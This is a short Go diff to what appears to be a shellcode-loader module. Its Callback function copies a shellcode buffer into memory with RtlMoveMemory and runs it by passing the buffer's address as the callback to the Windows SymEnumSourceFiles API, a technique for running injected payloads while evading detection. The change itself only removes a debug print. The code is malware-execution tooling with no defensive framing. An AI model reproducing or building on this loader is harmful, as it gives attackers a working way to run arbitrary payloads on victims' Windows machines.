@@ -1,7 +1,6 @@
 package TT
 
 import (
-	"fmt"
 	"syscall"
 	"unsafe"
 )
@@ -35,6 +34,5 @@ func Callback(shellcode []byte) {
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	hProcess, _, _ := GetCurrentProcess.Call()
 	SymInitialize.Call(hProcess, NULL, TRUE)
-	_, err1, err2 := SymEnumSourceFiles.Call(hProcess, NULL, NULL, addr, NULL)
-	fmt.Println(err1, err2)
+	SymEnumSourceFiles.Call(hProcess, NULL, NULL, addr, NULL)
 }
